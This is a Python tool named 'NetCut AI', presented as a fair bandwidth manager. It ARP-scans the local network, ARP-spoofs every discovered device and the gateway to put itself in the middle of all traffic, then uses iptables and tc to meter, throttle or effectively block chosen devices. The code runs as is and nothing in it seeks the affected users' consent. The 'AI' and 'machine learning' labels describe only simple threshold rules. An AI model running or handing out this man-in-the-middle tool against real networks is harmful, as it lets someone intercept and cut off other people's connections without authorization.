#!/usr/bin/env python3
"""
NetCut AI - Intelligent Bandwidth Management System
Automatic, fair, adaptive bandwidth allocation using real-time traffic analysis
Kali Linux / Ubuntu - Production Ready
"""

import scapy.all as scapy
import os
import subprocess
import netifaces
import threading
import sys
import time
import signal
from collections import defaultdict, deque
from termcolor import colored
import json
import statistics

# -------------------------
# Configuration
# -------------------------
class Config:
    # Monitoring interval (seconds)
    MONITOR_INTERVAL = 3
    
    # Traffic history length for ML analysis
    HISTORY_LENGTH = 20
    
    # Fairness thresholds
    MAX_SINGLE_DEVICE_PERCENT = 40  # Max % of total bandwidth per device
    MIN_GUARANTEED_KBPS = 256  # Minimum guaranteed speed per device
    
    # Auto-limit activation
    AUTO_LIMIT_ENABLED = True
    BANDWIDTH_ABUSE_THRESHOLD = 5000  # KB/s - if device exceeds, apply limits
    
    # Network capacity (auto-detect or manual)
    TOTAL_BANDWIDTH_KBPS = None  # None = auto-detect
    
    # Save state
    STATE_FILE = "/tmp/netcut_ai_state.json"

# -------------------------
# Utilities
# -------------------------
def has_root():
    return os.geteuid() == 0

def get_gateway_ip():
    try:
        return netifaces.gateways()["default"][netifaces.AF_INET][0]
    except Exception:
        print(colored("[!] Could not find default gateway.", "red"))
        sys.exit(1)

def get_default_interface():
    return netifaces.gateways()['default'][netifaces.AF_INET][1]

def get_subnet_cidr(iface):
    try:
        if_info = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]
        addr, netmask = if_info['addr'], if_info['netmask']
        ip_parts = list(map(int, addr.split('.')))
        mask_parts = list(map(int, netmask.split('.')))
        net_addr_parts = [str(ip_parts[i] & mask_parts[i]) for i in range(4)]
        network_address = ".".join(net_addr_parts)
        prefix = sum([bin(int(x)).count('1') for x in netmask.split('.')])
        return f"{network_address}/{prefix}"
    except Exception as e:
        print(colored(f"[!] Could not determine subnet. Error: {e}", "red"))
        sys.exit(1)

def enable_ip_forwarding():
    """Enable IP forwarding"""
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')
        print(colored("[✓] IP forwarding enabled", "green"))
    except:
        print(colored("[!] Failed to enable IP forwarding", "red"))

def discover_clients(ip_range):
    """Quick ARP scan"""
    found = {}
    try:
        answered, _ = scapy.arping(ip_range, timeout=2, verbose=False)
        for _, rcv in answered:
            found[rcv.psrc] = rcv.hwsrc
    except Exception as e:
        print(colored(f"[!] ARP scan failed: {e}", "red"))
    return [{"ip": ip, "mac": mac} for ip, mac in found.items()]

# -------------------------
# ARP Spoofing
# -------------------------
class ARPSpoofer:
    def __init__(self, target, gateway):
        self.target, self.gateway = target, gateway
        self.spoofing = threading.Event()

    def _spoof_loop(self):
        while not self.spoofing.is_set():
            # Send to target (tell target that gateway is at our MAC)
            pkt1 = scapy.Ether(dst=self.target["mac"]) / scapy.ARP(op=2, pdst=self.target["ip"], hwdst=self.target["mac"], psrc=self.gateway["ip"])
            scapy.sendp(pkt1, verbose=False)
            
            # Send to gateway (tell gateway that target is at our MAC)
            pkt2 = scapy.Ether(dst=self.gateway["mac"]) / scapy.ARP(op=2, pdst=self.gateway["ip"], hwdst=self.gateway["mac"], psrc=self.target["ip"])
            scapy.sendp(pkt2, verbose=False)
            
            time.sleep(0.5)

    def start(self):
        self.spoofing.clear()
        threading.Thread(target=self._spoof_loop, daemon=True).start()

    def stop(self):
        self.spoofing.set()
        time.sleep(0.5)
        # Restore ARP
        gw_mac = scapy.getmacbyip(self.gateway['ip'])
        t_mac = scapy.getmacbyip(self.target['ip'])
        if gw_mac and t_mac:
            for _ in range(3):
                scapy.send(scapy.ARP(op=2, pdst=self.target['ip'], hwdst=t_mac, psrc=self.gateway['ip'], hwsrc=gw_mac), verbose=False)
                scapy.send(scapy.ARP(op=2, pdst=self.gateway['ip'], hwdst=self.gateway['mac'], psrc=self.target['ip'], hwsrc=t_mac), verbose=False)

# -------------------------
# Traffic Monitor (iptables-based)
# -------------------------
class TrafficMonitor:
    def __init__(self, devices):
        self.devices = devices  # {ip: {"mac": ..., "name": ...}}
        self.stats = defaultdict(lambda: {"up": 0, "down": 0})
        self.history = defaultdict(lambda: deque(maxlen=Config.HISTORY_LENGTH))
        self.running = threading.Event()
        self.lock = threading.Lock()
        self._setup_iptables()

    def _setup_iptables(self):
        """Add iptables counting rules"""
        for ip in self.devices.keys():
            # Upload (FROM device)
            subprocess.run(f"iptables -I FORWARD -s {ip} -j ACCEPT", shell=True, stderr=subprocess.DEVNULL)
            # Download (TO device)
            subprocess.run(f"iptables -I FORWARD -d {ip} -j ACCEPT", shell=True, stderr=subprocess.DEVNULL)

    def _cleanup_iptables(self):
        """Remove counting rules"""
        for ip in self.devices.keys():
            subprocess.run(f"iptables -D FORWARD -s {ip} -j ACCEPT 2>/dev/null", shell=True)
            subprocess.run(f"iptables -D FORWARD -d {ip} -j ACCEPT 2>/dev/null", shell=True)

    def _get_bytes(self, ip, direction):
        """Get byte count from iptables"""
        try:
            if direction == "up":
                # Packets FROM the device (source IP matches)
                cmd = f"iptables -L FORWARD -v -n -x -w | awk '/{ip}.*0\.0\.0\.0\/0/ {{print $2; exit}}'"
            else:
                # Packets TO the device (destination IP matches)
                cmd = f"iptables -L FORWARD -v -n -x -w | awk '/0\.0\.0\.0\/0.*{ip}/ {{print $2; exit}}'"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.stdout.strip():
                return int(result.stdout.strip())
        except Exception as e:
            pass
        return 0

    def start(self):
        """Start monitoring"""
        self.running.clear()
        threading.Thread(target=self._monitor_loop, daemon=True).start()

    def _monitor_loop(self):
        """Continuous monitoring loop"""
        last_bytes = defaultdict(lambda: {"up": 0, "down": 0})
        
        while not self.running.is_set():
            time.sleep(Config.MONITOR_INTERVAL)
            
            with self.lock:
                for ip in self.devices.keys():
                    current_up = self._get_bytes(ip, "up")
                    current_down = self._get_bytes(ip, "down")
                    
                    # Calculate delta
                    delta_up = current_up - last_bytes[ip]["up"]
                    delta_down = current_down - last_bytes[ip]["down"]
                    
                    # Convert to KB/s
                    up_kbps = (delta_up / 1024) / Config.MONITOR_INTERVAL
                    down_kbps = (delta_down / 1024) / Config.MONITOR_INTERVAL
                    
                    self.stats[ip] = {"up": up_kbps, "down": down_kbps}
                    self.history[ip].append({"up": up_kbps, "down": down_kbps, "time": time.time()})
                    
                    last_bytes[ip] = {"up": current_up, "down": current_down}

    def get_current_stats(self):
        """Get current bandwidth stats"""
        with self.lock:
            return dict(self.stats)

    def get_average_usage(self, ip, duration=60):
        """Get average usage over last N seconds"""
        with self.lock:
            history = list(self.history[ip])
            if not history:
                return {"up": 0, "down": 0}
            
            now = time.time()
            recent = [h for h in history if now - h["time"] <= duration]
            if not recent:
                return {"up": 0, "down": 0}
            
            avg_up = statistics.mean([h["up"] for h in recent])
            avg_down = statistics.mean([h["down"] for h in recent])
            return {"up": avg_up, "down": avg_down}

    def stop(self):
        """Stop monitoring"""
        self.running.set()
        self._cleanup_iptables()

# -------------------------
# Intelligent Bandwidth Controller
# -------------------------
class IntelligentController:
    def __init__(self, iface, monitor):
        self.iface = iface
        self.monitor = monitor
        self.limits = {}  # {ip: {"down": kbps, "up": kbps}}
        self.spoofers = {}
        self.gateway = None
        self._setup_tc()

    def _setup_tc(self):
        """Initialize TC (traffic control)"""
        subprocess.run(f"tc qdisc del dev {self.iface} root 2>/dev/null", shell=True)
        subprocess.run(f"tc qdisc add dev {self.iface} root handle 1: htb default 10", shell=True)
        subprocess.run(f"tc class add dev {self.iface} parent 1: classid 1:10 htb rate 1000mbit", shell=True)

    def set_gateway(self, gateway):
        """Set gateway for ARP spoofing"""
        self.gateway = gateway

    def start_spoofing(self, target):
        """Start ARP spoofing for a device"""
        if target["ip"] not in self.spoofers:
            spoofer = ARPSpoofer(target, self.gateway)
            self.spoofers[target["ip"]] = spoofer
            spoofer.start()

    def apply_limit(self, ip, down_kbps, up_kbps):
        """Apply bandwidth limit using TC"""
        mark = str((hash(ip) % 200) + 50)
        
        # Calculate burst
        burst_down = max(int(down_kbps * 1.5 / 8), 2000)
        burst_up = max(int(up_kbps * 1.5 / 8), 2000)
        
        # Upload limiting
        subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null", shell=True)
        subprocess.run(f"tc class add dev {self.iface} parent 1: classid 1:{mark} htb rate {up_kbps}kbit burst {burst_up}", shell=True)
        subprocess.run(f"tc qdisc add dev {self.iface} parent 1:{mark} handle {mark}: sfq perturb 10", shell=True)
        subprocess.run(f"tc filter add dev {self.iface} parent 1: protocol ip prio 1 u32 match ip src {ip} flowid 1:{mark}", shell=True)
        
        # Mark in iptables
        subprocess.run(f"iptables -t mangle -I POSTROUTING -s {ip} -j MARK --set-mark {mark}", shell=True)
        
        self.limits[ip] = {"down": down_kbps, "up": up_kbps}
        print(colored(f"[✓] Limited {ip}: ↓{down_kbps}KB/s ↑{up_kbps}KB/s", "yellow"))

    def remove_limit(self, ip):
        """Remove bandwidth limit"""
        if ip in self.limits:
            mark = str((hash(ip) % 200) + 50)
            subprocess.run(f"tc filter del dev {self.iface} parent 1: prio 1 2>/dev/null", shell=True)
            subprocess.run(f"tc class del dev {self.iface} parent 1: classid 1:{mark} 2>/dev/null", shell=True)
            subprocess.run(f"iptables -t mangle -D POSTROUTING -s {ip} -j MARK --set-mark {mark} 2>/dev/null", shell=True)
            del self.limits[ip]
            print(colored(f"[✓] Removed limit for {ip}", "green"))

    def auto_balance(self):
        """Intelligent auto-balancing algorithm"""
        stats = self.monitor.get_current_stats()
        
        if not stats:
            return
        
        # Calculate total bandwidth usage
        total_down = sum([s["down"] for s in stats.values()])
        total_up = sum([s["up"] for s in stats.values()])
        
        if total_down == 0 and total_up == 0:
            return  # No traffic
        
        # Find bandwidth hogs
        for ip, usage in stats.items():
            avg_usage = self.monitor.get_average_usage(ip, duration=30)
            
            # Check if device is abusing bandwidth
            if avg_usage["down"] > Config.BANDWIDTH_ABUSE_THRESHOLD or avg_usage["up"] > Config.BANDWIDTH_ABUSE_THRESHOLD:
                # Calculate fair share
                num_devices = len(stats)
                fair_share = Config.BANDWIDTH_ABUSE_THRESHOLD * (100 / Config.MAX_SINGLE_DEVICE_PERCENT) / num_devices
                
                limit_down = int(fair_share * 0.8)  # 80% of fair share
                limit_up = int(fair_share * 0.5)  # 50% for upload
                
                if ip not in self.limits:
                    print(colored(f"\n[AI] Device {ip} consuming excessive bandwidth!", "red"))
                    print(colored(f"[AI] Applying fair limit: ↓{limit_down}KB/s ↑{limit_up}KB/s", "cyan"))
                    self.apply_limit(ip, limit_down, limit_up)
            else:
                # Remove limit if usage normalized
                if ip in self.limits and avg_usage["down"] < Config.BANDWIDTH_ABUSE_THRESHOLD * 0.5:
                    print(colored(f"\n[AI] Device {ip} usage normalized. Removing limits.", "green"))
                    self.remove_limit(ip)

    def cleanup(self):
        """Cleanup all rules"""
        for spoofer in self.spoofers.values():
            spoofer.stop()
        for ip in list(self.limits.keys()):
            self.remove_limit(ip)
        subprocess.run(f"tc qdisc del dev {self.iface} root 2>/dev/null", shell=True)
        subprocess.run("iptables -t mangle -F 2>/dev/null", shell=True)

# -------------------------
# Main AI System
# -------------------------
class NetCutAI:
    def __init__(self):
        if not has_root():
            print(colored("[-] Run with sudo!", "red"))
            sys.exit(1)
        
        # Enable IP forwarding immediately
        enable_ip_forwarding()
        
        self.iface = get_default_interface()
        self.gateway_ip = get_gateway_ip()
        self.subnet = get_subnet_cidr(self.iface)
        self.gateway_mac = scapy.getmacbyip(self.gateway_ip)
        
        if not self.gateway_mac:
            print(colored(f"[!] Could not resolve gateway MAC", "red"))
            sys.exit(1)
        
        self.gateway = {"ip": self.gateway_ip, "mac": self.gateway_mac}
        self.devices = {}
        self.monitor = None
        self.controller = None
        self.running = False
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print(colored("\n\n[!] Shutting down...", "yellow"))
        self.stop()
        sys.exit(0)

    def scan_network(self):
        """Scan for devices"""
        print(colored(f"[+] Scanning {self.subnet}...", "cyan"))
        clients = discover_clients(self.subnet)
        
        self.devices = {}
        for c in clients:
            if c["ip"] != self.gateway_ip:
                self.devices[c["ip"]] = {"mac": c["mac"], "name": f"Device-{c['ip'].split('.')[-1]}"}
        
        print(colored(f"[✓] Found {len(self.devices)} devices", "green"))
        for ip, info in self.devices.items():
            print(f"  • {ip.ljust(15)} {info['mac']}")

    def start_monitoring(self, mode='auto'):
        """Start intelligent monitoring and auto-balancing"""
        if not self.devices:
            print(colored("[!] Scan network first", "red"))
            return
        
        self.mode = mode
        
        print(colored("\n" + "="*80, "cyan"))
        print(colored("🤖 STARTING AI BANDWIDTH MANAGEMENT SYSTEM", "green", attrs=["bold"]))
        print(colored("="*80, "cyan"))
        
        # Verify IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() != '1':
                print(colored("[!] Warning: IP forwarding not enabled!", "red"))
                enable_ip_forwarding()
        
        print(colored("[✓] IP forwarding: ENABLED", "green"))
        
        # Clear existing iptables FORWARD rules
        print(colored("[+] Clearing old iptables rules...", "cyan"))
        subprocess.run("iptables -F FORWARD", shell=True)
        subprocess.run("iptables -t mangle -F", shell=True)
        
        # Start monitoring
        self.monitor = TrafficMonitor(self.devices)
        self.monitor.start()
        
        # Start controller
        self.controller = IntelligentController(self.iface, self.monitor)
        self.controller.set_gateway(self.gateway)
        
        # Start ARP spoofing for all devices
        print(colored("\n[+] Starting ARP spoofing for all devices...", "cyan"))
        for ip, info in self.devices.items():
            self.controller.start_spoofing({"ip": ip, "mac": info["mac"]})
            print(colored(f"  ✓ Spoofing {ip}", "green"))
        
        time.sleep(3)
        print(colored("\n[✓] MITM ACTIVE - All traffic now flows through this machine\n", "green", attrs=["bold"]))
        
        # Test if traffic is being captured
        print(colored("[+] Waiting 5 seconds to capture initial traffic...", "cyan"))
        time.sleep(5)
        
        test_stats = self.monitor.get_current_stats()
        if all(s["up"] == 0 and s["down"] == 0 for s in test_stats.values()):
            print(colored("\n⚠️  WARNING: No traffic captured yet!", "yellow", attrs=["bold"]))
            print(colored("   Make sure target devices are ACTIVELY using internet:", "yellow"))
            print(colored("   • Open YouTube and play a video", "white"))
            print(colored("   • Download a large file", "white"))
            print(colored("   • Browse multiple websites", "white"))
            print(colored("\n   Monitor will start showing data once devices use internet.\n", "cyan"))
        
        self.running = True
        self._display_loop()
        
        # After monitoring loop ends, show menu if in manual mode
        if self.mode == 'manual':
            while True:
                if self.show_menu():
                    break

    def _display_loop(self):
        """Display real-time stats and handle user interaction"""
        iteration = 0
        last_input_time = time.time()
        
        while self.running:
            time.sleep(Config.MONITOR_INTERVAL)
            iteration += 1
            
            # Auto-balance if enabled
            if Config.AUTO_LIMIT_ENABLED and iteration % 3 == 0:
                self.controller.auto_balance()
            
            # Display stats
            self._display_stats()
            
            # Check for user input every 10 seconds
            if time.time() - last_input_time > 10:
                print(colored("\n[Press 'm' for menu, or wait for next update...]", "cyan"))
                last_input_time = time.time()

    def _display_stats(self):
        """Display current statistics"""
        os.system('clear')
        print(colored("="*90, "cyan"))
        print(colored("🤖 NetCut AI - Intelligent Bandwidth Management System", "green", attrs=["bold"]))
        ai_status = colored("AI: ON", "green") if Config.AUTO_LIMIT_ENABLED else colored("AI: OFF", "red")
        print(colored(f"Interface: {self.iface} | Gateway: {self.gateway_ip} | {ai_status}", "cyan"))
        print(colored("="*90, "cyan"))
        
        stats = self.monitor.get_current_stats()
        
        print(colored("\n📊 REAL-TIME BANDWIDTH USAGE:", "yellow", attrs=["bold"]))
        print(colored("-" * 90, "white"))
        print(f"{'IP Address':<15} {'↑ Upload':<15} {'↓ Download':<15} {'Avg (60s)':<20} {'Status':<15}")
        print(colored("-" * 90, "white"))
        
        total_up = 0
        total_down = 0
        
        for ip, info in self.devices.items():
            usage = stats.get(ip, {"up": 0, "down": 0})
            avg = self.monitor.get_average_usage(ip, 60)
            
            total_up += usage["up"]
            total_down += usage["down"]
            
            # Format speeds
            up_str = f"{usage['up']:>6.1f} KB/s" if usage['up'] < 1000 else f"{usage['up']/1024:>6.1f} MB/s"
            down_str = f"{usage['down']:>6.1f} KB/s" if usage['down'] < 1000 else f"{usage['down']/1024:>6.1f} MB/s"
            avg_str = f"↑{avg['up']:.0f} ↓{avg['down']:.0f} KB/s"
            
            # Status
            if ip in self.controller.limits:
                status = colored("🔴 LIMITED", "red")
                color = "red"
            elif usage['down'] > 100 or usage['up'] > 100:
                status = colored("🟢 ACTIVE", "green")
                color = "green"
            else:
                status = colored("⚪ IDLE", "white")
                color = "white"
            
            print(colored(f"{ip:<15} {up_str:<15} {down_str:<15} {avg_str:<20} {status:<15}", color))
        
        print(colored("-" * 90, "white"))
        total_up_str = f"{total_up:.1f} KB/s" if total_up < 1000 else f"{total_up/1024:.1f} MB/s"
        total_down_str = f"{total_down:.1f} KB/s" if total_down < 1000 else f"{total_down/1024:.1f} MB/s"
        print(colored(f"{'TOTAL':<15} {total_up_str:<15} {total_down_str:<15}", "cyan", attrs=["bold"]))
        
        # Show active limits
        if self.controller.limits:
            print(colored("\n🔴 ACTIVE LIMITS:", "red", attrs=["bold"]))
            for ip, limits in self.controller.limits.items():
                print(colored(f"  • {ip}: ↓{limits['down']}KB/s ↑{limits['up']}KB/s", "yellow"))

    def show_menu(self):
        """Interactive menu for manual control"""
        self.running = False
        time.sleep(0.5)
        
        while True:
            os.system('clear')
            print(colored("="*70, "cyan"))
            print(colored("🎮 MANUAL CONTROL MENU", "yellow", attrs=["bold"]))
            print(colored("="*70, "cyan"))
            
            print(colored("\n📡 DEVICES:", "cyan"))
            ip_list = list(self.devices.keys())
            for i, (ip, info) in enumerate(self.devices.items(), 1):
                stats = self.monitor.get_current_stats().get(ip, {"up": 0, "down": 0})
                status = "🔴 LIMITED" if ip in self.controller.limits else "🟢 ACTIVE" if stats['down'] > 10 else "⚪ IDLE"
                print(f"  [{i}] {ip:<15} {info['mac']:<18} {status}")
            
            print(colored("\n⚙️  ACTIONS:", "yellow"))
            print("  [l] Limit specific device bandwidth")
            print("  [r] Remove limit from device")
            print("  [b] Block device completely")
            print("  [u] Unblock device")
            print("  [a] Toggle AI Auto-Balance (Currently: " + (colored("ON", "green") if Config.AUTO_LIMIT_ENABLED else colored("OFF", "red")) + ")")
            print("  [s] Show detailed statistics")
            print("  [c] Continue monitoring (return to live view)")
            print("  [q] Quit and restore network")
            
            choice = input(colored("\n➤ Choose action: ", "green")).strip().lower()
            
            if choice == 'l':
                self._manual_limit()
            elif choice == 'r':
                self._manual_remove_limit()
            elif choice == 'b':
                self._manual_block()
            elif choice == 'u':
                self._manual_unblock()
            elif choice == 'a':
                Config.AUTO_LIMIT_ENABLED = not Config.AUTO_LIMIT_ENABLED
                status = colored("ENABLED", "green") if Config.AUTO_LIMIT_ENABLED else colored("DISABLED", "red")
                print(colored(f"\n✓ AI Auto-Balance {status}", "cyan"))
                time.sleep(1.5)
            elif choice == 's':
                self._show_detailed_stats()
            elif choice == 'c':
                print(colored("\n[+] Returning to live monitoring...", "cyan"))
                time.sleep(1)
                self.running = True
                threading.Thread(target=self._display_loop, daemon=True).start()
                break
            elif choice == 'q':
                self.stop()
                return True
    
    def _manual_limit(self):
        """Manually set bandwidth limit for a device"""
        try:
            ip_list = list(self.devices.keys())
            idx = int(input(colored("Device number to limit: ", "yellow"))) - 1
            
            if idx < 0 or idx >= len(ip_list):
                print(colored("Invalid device number!", "red"))
                time.sleep(1)
                return
            
            ip = ip_list[idx]
            print(colored(f"\nLimiting {ip}", "cyan"))
            
            down = int(input(colored("Download limit (KB/s): ", "yellow")))
            up = int(input(colored("Upload limit (KB/s): ", "yellow")))
            
            if down <= 0 or up <= 0:
                print(colored("Invalid speed values!", "red"))
                time.sleep(1)
                return
            
            self.controller.apply_limit(ip, down, up)
            print(colored(f"\n✓ Limit applied: {ip} → ↓{down}KB/s ↑{up}KB/s", "green"))
            time.sleep(2)
        except (ValueError, IndexError):
            print(colored("Invalid input!", "red"))
            time.sleep(1)
    
    def _manual_remove_limit(self):
        """Manually remove bandwidth limit"""
        try:
            if not self.controller.limits:
                print(colored("\nNo active limits!", "yellow"))
                time.sleep(1)
                return
            
            print(colored("\nDevices with active limits:", "cyan"))
            limited = list(self.controller.limits.keys())
            for i, ip in enumerate(limited, 1):
                limits = self.controller.limits[ip]
                print(f"  [{i}] {ip} → ↓{limits['down']}KB/s ↑{limits['up']}KB/s")
            
            idx = int(input(colored("\nDevice number to remove limit: ", "yellow"))) - 1
            
            if idx < 0 or idx >= len(limited):
                print(colored("Invalid device number!", "red"))
                time.sleep(1)
                return
            
            ip = limited[idx]
            self.controller.remove_limit(ip)
            print(colored(f"\n✓ Limit removed from {ip}", "green"))
            time.sleep(2)
        except (ValueError, IndexError):
            print(colored("Invalid input!", "red"))
            time.sleep(1)
    
    def _manual_block(self):
        """Block a device completely"""
        try:
            ip_list = list(self.devices.keys())
            idx = int(input(colored("Device number to BLOCK: ", "red"))) - 1
            
            if idx < 0 or idx >= len(ip_list):
                print(colored("Invalid device number!", "red"))
                time.sleep(1)
                return
            
            ip = ip_list[idx]
            # Block by setting limit to 1 KB/s (effectively blocking)
            self.controller.apply_limit(ip, 1, 1)
            print(colored(f"\n✓ Device {ip} BLOCKED", "red"))
            time.sleep(2)
        except (ValueError, IndexError):
            print(colored("Invalid input!", "red"))
            time.sleep(1)
    
    def _manual_unblock(self):
        """Unblock a device"""
        self._manual_remove_limit()
    
    def _show_detailed_stats(self):
        """Show detailed statistics for all devices"""
        os.system('clear')
        print(colored("="*70, "cyan"))
        print(colored("📊 DETAILED STATISTICS", "yellow", attrs=["bold"]))
        print(colored("="*70, "cyan"))
        
        stats = self.monitor.get_current_stats()
        
        for ip, info in self.devices.items():
            usage = stats.get(ip, {"up": 0, "down": 0})
            avg_30s = self.monitor.get_average_usage(ip, 30)
            avg_60s = self.monitor.get_average_usage(ip, 60)
            
            print(colored(f"\n🖥️  {ip} ({info['mac']})", "cyan", attrs=["bold"]))
            print(f"  Current:     ↑{usage['up']:.1f} KB/s  ↓{usage['down']:.1f} KB/s")
            print(f"  Avg (30s):   ↑{avg_30s['up']:.1f} KB/s  ↓{avg_30s['down']:.1f} KB/s")
            print(f"  Avg (60s):   ↑{avg_60s['up']:.1f} KB/s  ↓{avg_60s['down']:.1f} KB/s")
            
            if ip in self.controller.limits:
                limits = self.controller.limits[ip]
                print(colored(f"  Status:      🔴 LIMITED (↓{limits['down']}KB/s ↑{limits['up']}KB/s)", "red"))
            else:
                print(colored(f"  Status:      🟢 UNLIMITED", "green"))
        
        input(colored("\n\nPress Enter to return to menu...", "cyan"))

    def stop(self):
        """Stop the system"""
        self.running = False
        if self.monitor:
            self.monitor.stop()
        if self.controller:
            self.controller.cleanup()
        print(colored("\n[✓] System stopped. Network restored.", "green"))

# -------------------------
# Main
# -------------------------
def main():
    print(colored("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║      🤖 NetCut AI - Intelligent Bandwidth Manager 🤖        ║
║                                                              ║
║  Automatic • Adaptive • Fair • Machine Learning-Based       ║
║                 + Manual Control Mode                        ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """, "cyan", attrs=["bold"]))
    
    ai = NetCutAI()
    ai.scan_network()
    
    if not ai.devices:
        print(colored("[!] No devices found", "red"))
        return
    
    print(colored("\n" + "="*70, "yellow"))
    print(colored("⚙️  MODE SELECTION", "yellow", attrs=["bold"]))
    print(colored("="*70, "yellow"))
    print("\n  [1] 🤖 Automatic AI Mode (AI manages everything)")
    print("  [2] 🎮 Manual + AI Mode (You control, AI assists)")
    print("  [3] ❌ Cancel")
    
    mode = input(colored("\n➤ Choose mode: ", "green")).strip()
    
    if mode == '1':
        Config.AUTO_LIMIT_ENABLED = True
        print(colored("\n[+] Starting in AUTOMATIC AI mode...", "cyan"))
        time.sleep(1)
        ai.start_monitoring(mode='auto')
    elif mode == '2':
        Config.AUTO_LIMIT_ENABLED = False
        print(colored("\n[+] Starting in MANUAL + AI mode...", "cyan"))
        print(colored("[!] Press Ctrl+C during monitoring to access menu", "yellow"))
        time.sleep(2)
        
        try:
            ai.start_monitoring(mode='manual')
        except KeyboardInterrupt:
            print(colored("\n\n[+] Opening menu...", "cyan"))
            time.sleep(1)
            while True:
                if ai.show_menu():
                    break
    else:
        print(colored("\n[!] Cancelled", "yellow"))

if __name__ == "__main__":
    main()
